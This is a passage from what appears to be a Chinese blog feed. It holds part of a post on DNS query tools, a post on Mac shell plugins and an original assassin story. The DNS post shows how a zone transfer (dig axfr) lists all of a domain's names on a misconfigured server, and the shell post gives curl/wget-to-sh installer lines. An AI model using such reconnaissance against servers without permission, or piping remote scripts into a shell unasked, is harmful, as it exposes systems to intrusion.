<p>进入交互式界面，输入查询命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&gt;<span class="built_in">set</span> <span class="built_in">type</span>=a              <span class="comment">#设置更改要查询的dns解析类型</span></div><div class="line">&gt;thief.one               <span class="comment">#输入要查询的域名</span></div><div class="line">&gt;<span class="built_in">set</span> <span class="built_in">type</span>=mx             <span class="comment">#设置更改要查询的dns解析类型</span></div><div class="line">&gt;thief.one</div><div class="line">&gt;server 114.114.114.114  <span class="comment">#设置更改要查询的dns服务器地址</span></div><div class="line">&gt;ls thief.one <span class="comment">#ls命令列出某个域中的所有域名</span></div></pre></td></tr></table></figure></p>
<p>可以更改的type类型：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">-A    <span class="comment">#A记录</span></div><div class="line">-AAAA</div><div class="line">-CNAME <span class="comment">#CNAME纪录</span></div><div class="line">-HINFO</div><div class="line">-MB</div><div class="line">-MG</div><div class="line">-MR</div><div class="line">-MX <span class="comment">#电子邮件交换记录，记录一个邮件域名对应的IP地址</span></div><div class="line">-NS <span class="comment">#域名服务器记录,记录该域名由哪台域名服务器解析</span></div><div class="line">-PTR <span class="comment">#反向记录,也即从IP地址到域名的一条记录</span></div><div class="line">-TXT <span class="comment">#记录域名的相关文本信息</span></div></pre></td></tr></table></figure></p>
<h3 id="host"><a href="#host" class="headerlink" title="host"></a>host</h3><p>与nslookup类似，也是查询域名对应的dns信息。</p>
<h4 id="Usage-1"><a href="#Usage-1" class="headerlink" title="Usage"></a>Usage</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">host -t A thief.one</div></pre></td></tr></table></figure>
<h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><ul>
<li>-a：显示详细的DNS信息； </li>
<li>-c&lt;类型&gt;：指定查询类型，默认值为“IN“； </li>
<li>-C：查询指定主机的完整的SOA记录； </li>
<li>-r：在查询域名时，不使用递归的查询方式； </li>
<li>-t&lt;类型&gt;：指定查询的域名信息类型； </li>
<li>-v：显示指令执行的详细信息； </li>
<li>-w：如果域名服务器没有给出应答信息，则总是等待，直到域名服务器给出应答； </li>
<li>-W&lt;时间&gt;：指定域名查询的最长时间，如果在指定时间内域名服务器没有给出应答信息，则退出指令； </li>
<li>-4：使用IPv4； host </li>
<li>-6：使用IPv6.</li>
</ul>
<h3 id="dig"><a href="#dig" class="headerlink" title="dig"></a>dig</h3><h4 id="Usage-2"><a href="#Usage-2" class="headerlink" title="Usage"></a>Usage</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">dig thief.one mx</div><div class="line">dig thief.one ns</div><div class="line">dig @202.106.0.20 thief.one a  指定dns服务器</div><div class="line">dig thief.one a +tcp  设置为tcp协议，默认为udp</div><div class="line">dig thief.one a +trace 这个参数之后将显示从根域逐级查询的过程</div></pre></td></tr></table></figure>
<p>若<em><a href="http://thief.one">http://thief.one</a></em>的DNS服务器为10.0.0.1，且存在域传送漏洞，则使用dig @10.0.0.1 <a href="http://thief.one">http://thief.one</a> axfr即可查看所有域名了。</p>
<h4 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a>参数</h4><ul>
<li>@&lt;服务器地址&gt;：指定进行域名解析的域名服务器； </li>
<li>-b：当主机具有多个IP地址，指定使用本机的哪个IP地址向域名服务器发送域名查询请求；</li>
<li>-f&lt;文件名称&gt;：指定dig以批处理的方式运行，指定的文件中保存着需要批处理查询的DNS任务信息； </li>
<li>-P：指定域名服务器所使用端口号； </li>
<li>-t&lt;类型&gt;：指定要查询的DNS数据类型； </li>
<li>-x：执行逆向域名查询； </li>
<li>-4：使用IPv4； </li>
<li>-6：使用IPv6； </li>
<li>-h：显示指令帮助信息。</li>
</ul>
<h3 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h3><p>whois用来查询域名相关信息，比如注册人信息，电子邮件，域名提供商，ip信息等等。</p>
<h4 id="Usage-3"><a href="#Usage-3" class="headerlink" title="Usage"></a>Usage</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">whois -p port thief.one</div></pre></td></tr></table></figure>
<p>更多用法可以使用<em>man whois</em>查看。</p>
<h3 id="传送门"><a href="#传送门" class="headerlink" title="传送门"></a>传送门</h3><p><a href="http://thief.one/2017/08/01/1/">【渗透神器系列】Metasploit</a><br><a href="http://thief.one/2017/04/10/1/">【渗透神器系列】nc</a><br><a href="http://thief.one/2017/05/02/1/">【渗透神器系列】nmap</a><br><a href="http://thief.one/2017/04/27/1">【渗透神器系列】Fiddler</a><br><a href="http://thief.one/2017/05/19/1">【渗透神器系列】搜索引擎</a><br><a href="http://thief.one/2017/02/09/WireShark%E8%BF%87%E6%BB%A4%E8%A7%84%E5%88%99/">【渗透神器系列】WireShark</a></p>
<p>DNS信息在线查询的网站很多，可以参考下：<a href="https://thief.one/SecWeb">SecWeb安全导航</a>另外网上类似的文章很多很多啦，大家可以全去搜索下，这里只是列举了一些常见的工具，若有好的后面会持续补充。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;Never put off what you can do today until tomorrow&lt;br&gt;今日事今日毕&lt;/blockquote&gt;&lt;br&gt;　　好久没有写文章啦，最近忙着换工作，搞事情，麻烦事一大推，凑空整理一篇DNS信息查询等工具用法吧。DNS查询在渗透或者运维工作经常遇到，尤其是内部有DNS服务器的公司，需要定时监测DNS解析的是否正常，有无被DNS劫持的情况。因此，学会一些工具快速查询检测DNS服务器状况显得尤为重要，本篇就介绍几款常见的DNS信息查询工具。&lt;br&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://thief.one/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="渗透神器" scheme="http://thief.one/tags/%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/"/>
    
      <category term="DNS" scheme="http://thief.one/tags/DNS/"/>
    
  </entry>
  
  <entry>
    <title>定制化MacShell</title>
    <link href="http://thief.one/2017/06/27/1/"/>
    <id>http://thief.one/2017/06/27/1/</id>
    <published>2017-06-27T02:17:09.000Z</published>
    <updated>2017-07-31T02:30:11.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">Keep on going never give up！<br>勇往直前，决不放弃！</blockquote><br>　　黑苹果用了将近半年，我也开始慢慢熟悉使用mac操作系统。然而之前我并没有真正发挥出mac高效率的一面，而只是停留于最基础的使用，为了能更高效的使用mac，近期我搜集了一些高效优雅地使用mac的案例，准备实操一番并做些记录。<br>　　如何高效地使用Mac？面对这个问题，我们可以从如何优雅地使用shell（也就是终端）开始探讨。首先不得不说mac自带的shell功能已经很强大了，但为了更好地办公，我们能做得还有很多。本篇将介绍几款Mac下shell增强工具（插件），使得Macshell的功能更加强大。<br><a id="more"></a></p>
<h3 id="iterm2"><a href="#iterm2" class="headerlink" title="iterm2"></a>iterm2</h3><p>安装比较简单，官网下载一个安装包即可。</p>
<h4 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h4><p>智能选中：</p>
<ul>
<li>双击选中字符串；</li>
<li>三击选中整行；</li>
<li>四击智能选中；</li>
</ul>
<p>按住⌘键：</p>
<ul>
<li>可以拖拽选中的字符串；</li>
<li>点击url，调用默认浏览器访问该网址；</li>
</ul>
<p>快捷键：</p>
<ul>
<li>切换tab：⌘+←, ⌘+→, ⌘+{, ⌘+}；⌘+数字直接定位到该tab；</li>
<li>新建tab：⌘+t；</li>
<li>顺序切换 pane：⌘+[, ⌘+]；</li>
<li>按方向切换 pane：⌘+Option+方向键；</li>
<li>切分屏幕：⌘+d水平切分，⌘+Shift+d垂直切分；</li>
<li>智能查找，支持正则查找：⌘+f；</li>
<li>自动补齐，按⌘+;；</li>
<li>弹出历史记录窗口，按⌘+Shift+h；</li>
<li>找到当前鼠标，⌘+/；</li>
</ul>
<h3 id="oh-my-zsh"><a href="#oh-my-zsh" class="headerlink" title="oh my zsh"></a>oh my zsh</h3><p>　　我们平常在mac上使用的shell通常都是bash-shell，而mac以及linux有另一款自带的shell异常强大，它就是zsh-shell。bash-shell的配置通常可以在用户目录下.bash_profile文件内设置，而zsh-shell同样可以在用户目录下.zshrc文件内设置。<br>　　由于zsh-shell是完全可定制化的，因此出现了一款开源工具–oh my zsh，它是一个开源的、社区驱动的框架，用来管理ZSH配置。</p>
<h4 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h4><p><a href="https://github.com/robbyrussell/oh-my-zsh" target="_blank" rel="external">https://github.com/robbyrussell/oh-my-zsh</a><br><a href="http://ohmyz.sh" target="_blank" rel="external">http://ohmyz.sh</a></p>
<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sh -c <span class="string">"<span class="variable">$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>"</span></div></pre></td></tr></table></figure>
<p>或者：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sh -c <span class="string">"<span class="variable">$(wget https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)</span>"</span></div></pre></td></tr></table></figure></p>
<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>切换到zsh-shell，可以通过命令行输入zsh进行查看。<br><img src="/upload_image/20170627/1.png" alt=""><br>或者设置shell启动开启zsh而不是bash：<br><img src="/upload_image/20170627/2.png" alt=""><br>oh-my-zsh有许多插件和主题，可以去 ~/.zshrc 配置。</p>
<h3 id="autojump"><a href="#autojump" class="headerlink" title="autojump"></a>autojump</h3><p>autojump是一款可以快速切换到指定目录的shell插件，支持模糊匹配，tab补全等功能。</p>
<h4 id="项目地址-1"><a href="#项目地址-1" class="headerlink" title="项目地址"></a>项目地址</h4><p><a href="https://github.com/wting/autojump" target="_blank" rel="external">https://github.com/wting/autojump</a></p>
<h4 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">brew install autojump</div></pre></td></tr></table></figure>
<h4 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h4><p>安装完以后终端直接输入autojump，如果没有报错，则说明安装成功。<br>如果遇到：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">please <span class="built_in">source</span> the correct autojump file <span class="keyword">in</span> your shell\<span class="string">'s startup file.</span></div></pre></td></tr></table></figure></p>
<p>则将以下内容添加到~/.zshrc文件末尾：（安装完oh my zsh会在用户目录下出现一个.zshrc文件）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[ -f /usr/<span class="built_in">local</span>/etc/profile.d/autojump.sh ] &amp;&amp; . /usr/<span class="built_in">local</span>/etc/profile.d/autojump.sh</div></pre></td></tr></table></figure></p>
<p>然后设置.zshrc文件中的plugins=(git autojump)。<br>配置完以后在终端输入：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">source</span> .zshrc</div></pre></td></tr></table></figure></p>
<p>用来启用.zshrc配置，或者注销用户重启shell来生效。</p>
<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">j 关键字</div></pre></td></tr></table></figure>
<p><img src="/upload_image/20170627/3.png" alt=""><br>注意：只有曾经访问过的目录，才能用autojump快速进入。</p>
<h3 id="zsh-autosuggestions"><a href="#zsh-autosuggestions" class="headerlink" title="zsh-autosuggestions"></a>zsh-autosuggestions</h3><p>这是一款可提示历史命令的shell插件。</p>
<h4 id="项目地址-2"><a href="#项目地址-2" class="headerlink" title="项目地址"></a>项目地址</h4><p><a href="https://github.com/zsh-users/zsh-autosuggestions" target="_blank" rel="external">https://github.com/zsh-users/zsh-autosuggestions</a></p>
<h4 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git <span class="built_in">clone</span> git://github.com/zsh-users/zsh-autosuggestions ~/.zsh/zsh-autosuggestions</div></pre></td></tr></table></figure>
<h4 id="配置-2"><a href="#配置-2" class="headerlink" title="配置"></a>配置</h4><p>vim .zshrc写入以下内容:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">source</span> ~/.zsh/zsh-autosuggestions/zsh-autosuggestions.zsh</div></pre></td></tr></table></figure></p>
<p>配置完以后在终端输入：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">source</span> .zshrc</div></pre></td></tr></table></figure></p>
<p>启用.zshrc配置，或者注销用户重启shell来生效。</p>
<h4 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h4><p><img src="/upload_image/20170627/4.png" alt=""></p>
<h3 id="icdiff"><a href="#icdiff" class="headerlink" title="icdiff"></a>icdiff</h3><p>diff的美化增强版，文件差异对比工具。</p>
<h4 id="项目地址-3"><a href="#项目地址-3" class="headerlink" title="项目地址"></a>项目地址</h4><p><a href="https://github.com/jeffkaufman/icdiff" target="_blank" rel="external">https://github.com/jeffkaufman/icdiff</a></p>
<h4 id="安装-3"><a href="#安装-3" class="headerlink" title="安装"></a>安装</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install git+https://github.com/jeffkaufman/icdiff.git</div></pre></td></tr></table></figure>
<h4 id="使用-2"><a href="#使用-2" class="headerlink" title="使用"></a>使用</h4><p><img src="/upload_image/20170627/5.png" alt=""></p>
<h3 id="httpie"><a href="#httpie" class="headerlink" title="httpie"></a>httpie</h3><p>curl美化版，格式化输出结果。</p>
<h4 id="项目地址-4"><a href="#项目地址-4" class="headerlink" title="项目地址"></a>项目地址</h4><p><a href="https://github.com/jakubroztocil/httpie/" target="_blank" rel="external">https://github.com/jakubroztocil/httpie/</a></p>
<h4 id="安装-4"><a href="#安装-4" class="headerlink" title="安装"></a>安装</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">brew install httpie</div></pre></td></tr></table></figure>
<h4 id="使用-3"><a href="#使用-3" class="headerlink" title="使用"></a>使用</h4><p><img src="/upload_image/20170627/6.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;Keep on going never give up！&lt;br&gt;勇往直前，决不放弃！&lt;/blockquote&gt;&lt;br&gt;　　黑苹果用了将近半年，我也开始慢慢熟悉使用mac操作系统。然而之前我并没有真正发挥出mac高效率的一面，而只是停留于最基础的使用，为了能更高效的使用mac，近期我搜集了一些高效优雅地使用mac的案例，准备实操一番并做些记录。&lt;br&gt;　　如何高效地使用Mac？面对这个问题，我们可以从如何优雅地使用shell（也就是终端）开始探讨。首先不得不说mac自带的shell功能已经很强大了，但为了更好地办公，我们能做得还有很多。本篇将介绍几款Mac下shell增强工具（插件），使得Macshell的功能更加强大。&lt;br&gt;
    
    </summary>
    
      <category term="技术研究" scheme="http://thief.one/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="Mac" scheme="http://thief.one/tags/Mac/"/>
    
  </entry>
  
  <entry>
    <title>【原创小说】刺青</title>
    <link href="http://thief.one/2017/06/22/1/"/>
    <id>http://thief.one/2017/06/22/1/</id>
    <published>2017-06-22T08:51:30.000Z</published>
    <updated>2017-07-25T12:05:00.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">用刺青，刻下凄美的伤疤，无法抹去，深入骨髓</blockquote><br>　　怀旧原创小说三部曲，这是最后一篇了，相信我，发完这篇我不会再发小说，是时候该好好研究研究技术了，不能整天不务正业。<br><a id="more"></a></p>
<p><center><img src="/upload_image/20170622/1.jpg" alt=""></center></p>
<h3 id="1-0］"><a href="#1-0］" class="headerlink" title="[1.0］"></a>[1.0］</h3><p>　　刺青，是用带有颜色的针刺入皮肤底层而在皮肤上制造一些图案或字眼出来，代表着个性或者某种身份。<br>　　在一般人看来，身上如若刻上刺青，则刺青背后一定隐藏着一段不可告人的秘密。很不幸的是，从我记事起，我左手臂上就刻有莲花刺青，而我可以对天发誓，我完全不知道，这块抹不去的刺青到底蕴藏着什么秘密。为了能解开刺青的奥秘，每当与梅生裸身泡在清溪中时，我必定用手指戳一戳梅生手臂上的莲花刺青，然后直勾着眼问：“梅哥，你说我俩手臂上的莲花刺青，到底蕴藏着啥秘密啊？难不曾是藏宝地图！”。<br>　　梅生慵懒地打着哈欠，很不耐烦地说道：“我说阿青，你都问了第九百九十九次了，你不烦我还烦呢！”，说完嫌弃地瞥了我一眼，仰天躺在清溪中呼呼大睡起来。<br>　　我气得连滚带爬上了河岸，从裤腰带里拔出一把小刀，对着河中的梅生喊道：“你再不说，我就把手臂上的莲花削去”。我心想吓唬吓唬他，凭借着我们从小共用一条裤腰带的交情，想必他也不会这么无情。不过随后我就发现，这只是我一厢情愿，梅生的呼噜声更响了，显然掩盖了我的叫喊。我灵机一动，拿起梅生的衣服就往家跑。当我回望着清溪，梅生已经赤裸着身子站在岸边，用水草遮掩私处，嘴里骂道：“刺青，你这个混蛋！”。<br>　　随后，在我日复一日的纠缠下，梅生终于说出了莲花刺青的秘密，结果却让我失望之极。他说，二十年前我们被一伙人贩子拐卖到风莲国，为了防止我们逃跑，他们请刺青师在我们身上刻下了相同的莲花刺青,后来因为战乱我俩逃了出来，从此相依为命。原本我是不相信梅生的鬼话的，可谁让他虚长我十岁呢，况且在我记忆里，儿时的生活就是与梅生一起的。更何况，看见他满脸可怜相，两眼汪汪地望着我，如同他第一次叫我刺青时，看我的眼神，让我不得不信。<br>　　二十年前，当我与梅生首次踏入风莲国，梅生奸笑着用他迷离的眼神盯着我说：“我们以后就要在此生活了，从现在开始，你就叫刺青，而我叫梅生”，我傻不啦叽地点了点头。如今，每每回想起此事，我都后悔不已，曾今的年少无知，让我被人叫了二十年的刺青。当我受不了别人的嘲讽，终于有一天把刀架在梅生的脖子上时，梅生委屈地从眼中挤出几滴泪，三言两语地说服了我，“你手臂刻有的刺青，就如同你的名字将伴随你一生，我是顺应天意也”。也许，我是真的太傻太天真，竟然相信了他的鬼话，全然没想到他手臂上的刺青与我分毫不差。<br>　　直到我赚到了第一桶金，我不得不相信梅生嘴中的天意。谁让我选择了刺客这条不归路呢，由此又是伴随我生命中一个刺字。刺客这个行当，看似潇洒，实则是哑巴吃黄连，有苦说不出啊，名副其实的高风险职业，不像戏子梅生那么清闲自在。每个月黑风高的夜晚，当梅生在舞台上摆弄着身姿，炫耀着腔调，我却游走于风口浪尖，潜入深门高墙之内。同样是化妆，梅生化得光彩照人，为的是吸引眼球，而我只需一席黑衣，一块面纱，为的是避人耳目。<br>　　每次筋疲力竭地回到家，看着梅生对着铜镜摆弄着身姿，我都不由一阵恶心。以至于，我采了无数的荷花叶，每晚对着莲花刺青反复涂搽，心想只要抹去了刺青，我就能摆脱天意，摆脱这种生活。谁知没等我看到希望，梅生便向我心头泼了盆冷水。他说，用刺青，刻下凄美的伤疤，无法抹去，深入骨髓。<br>　　我气得全身发抖，随即把他狠狠地揍了一顿，指着他的鼻子说：“我的伤疤只有凄凉，你的全是美丽，我俩一起才是凄美”。梅生摸着乌青的脸颊，指着愤然离去的我，说：“臭小子，让你别打脸，你让我拿什么混饭吃，你有种，晚上别回来了！”。</p>
<h3 id="2-0］"><a href="#2-0］" class="headerlink" title="[2.0］"></a>[2.0］</h3><p>　　位于大地之中的风莲国山明水秀，古色古香，城内的渭河贯穿南北，九曲回肠。城中渭河上，架空着一座金碧辉煌的香楼，碧瓦朱甍，高耸入云。香楼正门上“云烟楼”三个金色大字跃然于眼前。<br>　　云烟楼内不时传出几许欢声笑语，想必是姑娘们琴棋书画精通绝伦，美貌身姿惊人，引得官商富人发出淫邪的恶笑。每每望着姑娘们的舞姿，他们就会忘乎所以，口水不免飞流直下。作为一名冷血刺客，面对如此烟云，我丝毫不会深陷其中，直到遇见了月姬。月姬是云烟楼最有名的歌伎之一，她的一颦一簇都足以让看客神魂颠倒。然而，最让人销魂的还是她的琴声，每一弦都沁入身心，深入骨髓，让人深陷其中，无法自拔，“转轴拨弦三两声，未成曲调先有情”。<br>　　因为月姬，每当被梅生赶出家门，我都流落于云烟楼中，享受着轻歌曼舞，言笑晏晏。与其他客人不同的是，我只要求月姬相陪，即使她只卖艺不卖身，我也会重金相邀房内，举酒言欢，静静地欣赏着她弹奏离歌赋。<br>　　酒入肚囊，醉上心头，迷糊地望着眼前的月姬，我似乎找到了知己，倒头栽入月姬怀中哭诉着自己的委屈伤痛。天光极盛，刺入眼帘，我掀开被子，望着坐在窗前抚琴的月姬，尴尬地笑道：“姑娘，昨晚饮酒过甚，让你受惊了”。月姬起身摆好木琴，转身微微低着头望向我，微红的脸上写满羞涩。窗外清风徐徐，吹动着月姬的长发，风中衣袂飘飘，随风飘来的是淡淡的清香，我一时入了迷，全然不知月姬已离开了房间。<br>　　此后，每当完成任务收到赏金后，我都会夜留于月姬的闺房之内。月姬也习惯地拿出我最爱的女儿红，然后美美地弹奏着《春江花月夜》。酒过三巡，曲消音散，我依靠着窗台，望着浩瀚星海，抚摸着手臂上的刺青。除了梅生，谁也不知道我手臂上的刺青，包括月姬。原本她应该是会知道的，直到那天她在台上翩翩起舞，莺歌燕舞间清风吹起了她的长袖，透过薄薄的轻纱，一朵莲花刺青显露于手臂。后来，我从梅生口中得知，当年与我们一起被刻上刺青的还有一名女孩，现如今她已沦落云烟之地，艺名月姬。<br>　　正因为此事，我打消了向月姬显露刺青的计划，原因就在于不想打破她现在的生活，而让她因为自己勾起伤心往事。也是从那天起，我开始不接林枫的生意。作为刺客，难免身处险境，若是被人发现手臂上的刺青，不仅连累梅生，更会连累月姬，毕竟月姬手臂上的刺青早已不是什么秘密。世人永远是庸俗的，同样的刺青，刻在月姬身上，就成为了取悦眼球的纹饰。<br>　　林枫是林家堡主林天南的公子，家财万贯，声震武林。此人风度翩翩，温文尔雅，长得更是神明爽俊，目若朗星。至于此前我与他唯一的交集，也就是生意上的往来。以我的职业来说，生意上的往来就是他付钱，我杀人。像他这样的名门望族子弟，是不可能冒险行刺的，而林门仇家众多，因此我就成了林枫最好的生意伙伴。<br>　　我们的交易场所往往选择在云烟楼，此地云烟四起，歌舞淫乐间，谁也不会在意我们谈论的内容，即使有所耳闻，也全当酒后的胡言。即便如此，我们的接头也不能随随便便。每当林枫往酒杯倒酒，而后将酒壶壶嘴对着酒杯时，则寓意有活可接，而酒杯内酒的多少就寓意刺杀任务的难度高低。若是以往，我二话不说便上前拿起酒杯喝下，示意接下此活。而如今，我要么置之不理，要么上前拿起酒杯，洒向地面，示意此活接不了。<br>　　随着时光的流逝，原本以为再也不会接手林枫的买卖，可现实总归存在无奈。每当身处月姬闺房，抱着怀中的人间尤物，为她赎身的想法便浮动在脑海中。然而，巨额的赎身金像一块巨石重重压在我的心头，数月夜寝于云烟楼的生活，已花完了我所有的积蓄，此时唯有出山才能筹得赎金。<br>　　捆紧纸条，放飞的白鸽翱翔于蓝天下，飞往林家堡。</p>
<h3 id="3-0］"><a href="#3-0］" class="headerlink" title="[3.0］"></a>[3.0］</h3><p>　　隔日黄昏，林枫摇曳着纸扇，踏进了云烟楼。随即，楼内砸开了锅，姑娘们纷纷涌向眼前的豪门公子，不知不觉中姑娘们的芙蓉色上衣已经敞开，露出白皙的锁骨，扭腰弄眉地围绕着林枫。林枫还是一贯的孤傲，如同几年前的第一次相遇，撇着眼对我露出不屑的眼神，尽管眼前美女如云，他也不正眼相看。<br>　　林枫径直地走向我，待到跟前，俯身贴近我微醉的脸庞，深深相惜，此情此景真是羡煞云烟楼的姑娘。我一手酒瓶一手酒杯，尴尬地笑道：“林兄，我可没那癖好！”。林枫贴着耳朵苦笑道：“为了避开云烟楼的姑娘们，刺兄，只能委屈你了！”，随即抢过我手中的酒杯，饮下后放声大笑。留下我无辜地望了望身旁的月姬，撇着嘴直摇头。<br>　　林枫拉起卧倒在墙角的我，轻声说道：“此次任务事关重大，你我房内相商”，我借着酒劲一头栽进林枫的怀中，两人缠绵着步入厢房，留下姑娘们一脸的茫然，唯独月姬抿着嘴独乐。<br>　　厢房内，林枫摆好酒杯，往里缓缓倒酒。酒杯中，暗褐色的酒水由浅变深，直至溢出杯口。我二话不说，上前拿起酒杯喝下，对着林枫说道：“只要赏金足够，其他的不用多说”。话虽如此，我也不能胡乱接活，如若接了自己能力所不及的，怕是要丢了性命。林枫与我表面上算是生意伙伴，实则通过几年的合作，也建立了兄弟情义。他能交给我的活，必定是不会伤及我性命的。<br>　　直到入夜，我隐匿于相天府深墙之上，偷偷望着深墙内密集的兵力，回想起自己对林枫说的话，肠子都悔青了。林枫凭借着几年的情义，骗取我的感情，把我往火堆里推。我心想着，回去一定要多收点赏金，要不然就绝交。<br>　　还没等我气消，交替巡逻的近卫队就发现了我的踪影。只见他们快速散开阵型，对我形成了包围阵势。眼见自己被围得水泄不通，我只能无奈地望着头顶飞过的乌鸦，心想着插翅也难逃了。不过作为一名敬业的刺客，若是束手就擒则显得太没有职业道德，于是我亮出了弯刀，脚尖轻点深墙之上，轻身飞跃于屋瓦之间。<br>　　明月之下，弯刀闪现着寒光，身影过处，尸骸一片。激战维持了几个时辰，最终以我体力不支告负。刀光剑影间，我身受数刀，血流不止，直至被死死地逼在深墙之内。当我束手无策之时，一道黑影闪过，随即惨叫声此起彼伏。<br>　　黑影见机背起我往墙外飞去，只见他身轻如燕，一转眼便逃离了包围圈。驮负在黑影上，我轻轻地敲了敲黑衣人的脑袋，哭丧着说道：“好你个梅生，现在才来救我，可怜我满身是伤”。梅生解下面纱，大笑道：“你活该，将军府你都敢闯，这不是找死吗！要不是月姬找到我，请求我暗中保护你，你早已是死人啦”。<br>　　我敲打着梅生的后背，埋怨道：“这得怪你，拥有绝世的轻功，却甘心当一名戏子，害得我每夜只身一人游走于死亡边缘，我好惨啊！”。梅生打着哈气，慵懒地说道：“你再啰啰嗦嗦，唧唧歪歪，我就把你扔下去，到时你才叫惨！”。我朝他后脑勺翻了翻白眼，身子一摊重重地压在他身上，随即缓缓地闭上双眼，安心入睡。<br>　　次日清晨，天光透过纸窗刺入眼帘。月姬坐在床前，手里端着热汤，睁着水灵的眼温柔地看着我，不时用嘴吹散汤中的热气。我微笑着喝下月姬亲手熬制的良药，良药虽苦，入口即甜啊！<br>　　原本以为林枫再也没脸来见我了，谁知他的脸皮不是一般厚。临近正午，林枫提着几包礼品，登门造访，我黑着脸指着他的鼻子骂道：“要不是看在你替月姬赎身的份上，我早揍你了！”。林枫脸上也略显尴尬，羞愧地说道：“刺兄，此次是我没有设想周全，让你受苦了”。看在钱的面子上，此事也就不了了之了，况且我也实在不想失去财主，好在也没伤及性命。<br>　　此次受伤后，我再也没有接过活，整日游走于梅生的戏场与林家堡之间。梅生对戏曲的兴趣极其浓厚，当年他拿出所有的积蓄加入了老戏班，经过十几年的摸爬滚打，如今他已是戏班主，绝对的风莲城第一名角。至于我们的轻功，则是梅生无意中捡到一本武功秘籍，我们起初只是随着瞎练，没想到却练就得身轻如燕。而我造访林家堡的目的，就是为了拿取生活的补贴，全当是林枫为我受伤付的赔偿金。而继那次受伤后，林枫待我如亲兄弟，林家堡像是对我设有特权，出入自由。<br>　　当然，我也不是厚颜无耻之徒，拿满一年的赔偿金后，我与月姬合计着开了一家酒馆，凭借着月姬的美艳，顾客自然是络绎不绝，生活也总算开始平静而滋润。</p>
